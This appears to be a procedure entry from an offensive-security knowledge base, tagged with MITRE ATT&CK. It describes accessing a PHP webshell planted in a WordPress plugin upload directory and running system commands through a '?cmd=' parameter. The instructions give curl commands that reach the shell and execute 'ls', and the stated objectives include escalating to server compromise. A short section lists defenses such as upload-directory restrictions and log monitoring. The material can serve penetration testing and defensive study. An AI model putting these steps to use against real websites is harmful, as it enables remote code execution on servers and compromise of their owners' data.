---
tags:
  - rce
  - webshell
  - execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/php-webshell-execute]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:19.961Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 77c87cb6-527f-4398-a097-164b69d282a2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Access-and-Execute-Webshell-for-RCE

## Summary

This procedure accesses the extracted PHP webshell via HTTP and executes system commands to demonstrate remote code execution.

## Description

After upload, the files extract to a path like /wp-content/uploads/articulate_uploads/[random]/index.php. Append ?cmd= to run commands. Browser or curl can be used. Expected outcome: Server executes commands, outputting results, confirming full RCE.

## Requirements

1. Successful upload from prior step
2. Knowledge of extraction path (from response or guess)
3. Web browser or curl for access

## Defense

Defensive measures and detection strategies:

- Remove execute permissions from upload directories
- Scan for webshells with tools like Wordfence
- Monitor access logs for suspicious GET parameters like ?cmd=
- Implement PHP execution restrictions via .htaccess

## Objectives

1. Verify webshell deployment
2. Execute proof-of-concept commands
3. Escalate to server compromise

## Instructions

### Step 1: Locate and Access Webshell

**Context**: Identify the path from upload response (e.g., articulate_uploads/blabla/).

**Command** (Browser or curl to base path).
```bash
curl http://target.com/wp-content/uploads/articulate_uploads/blabla/index.php
```

> Expected output: No output or error if no cmd.

### Step 2: Execute Command

**Context**: Append command to ?cmd= for RCE.

**Command** ([[commands/php-webshell-execute]]):
```bash
curl "http://target.com/wp-content/uploads/articulate_uploads/blabla/index.php?cmd=ls"
```

> Expected output: Directory listing from ls.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/php-webshell-execute]]

## Tools Used


## Tags

- rce
- webshell
- execution
